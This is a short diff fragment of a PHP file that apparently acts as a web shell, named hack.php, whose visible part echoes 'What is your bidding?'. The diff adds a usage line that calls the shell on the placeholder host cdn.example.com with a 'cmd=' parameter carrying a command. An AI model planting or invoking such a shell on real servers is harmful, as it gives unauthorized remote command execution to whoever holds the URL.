@@ -6,3 +6,6 @@
     echo "What is your bidding?";
   }
 ?>
+
+
+cdn.example.com/1a2fe/hack.php?cmd=command+goes+here
